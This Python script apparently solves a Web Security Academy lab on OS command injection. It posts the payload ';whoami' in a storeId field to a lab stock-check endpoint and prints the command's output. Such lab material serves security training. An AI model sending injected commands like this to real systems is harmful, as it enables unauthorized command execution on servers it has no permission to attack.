#########################################################
#
# Lab: OS command injection, simple case
#
# Steps: 1. Inject payload into "storeId" parameter 
#           to execute the `whoami` command
#        2. Observe the `whoami` output in the response
#
#########################################################
import requests
from colorama import Fore

# change this to your lab URL
LAB_URL = "https://0a6e00ec04ff62a4838dc3ff005a0018.web-security-academy.net" 

def main():
    print(Fore.WHITE + "⦗#⦘ Injection point: " + Fore.YELLOW + "storeId")
    print(Fore.WHITE + "❯❯ Injecting payload to execute the `whoami` command.. ", end="", flush=True)
    
    payload = ";whoami"
    data = { "productId": "2", "storeId": payload }

    try: 
        check_stock_with_payload = requests.post(f"{LAB_URL}/product/stock", data)
        
    except:
        print(Fore.RED + "⦗!⦘ Failed to check stock with the injected payload through exception")
        exit(1)

    whoami = check_stock_with_payload.text

    print(Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + whoami)
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")

if __name__ == "__main__":
    main()
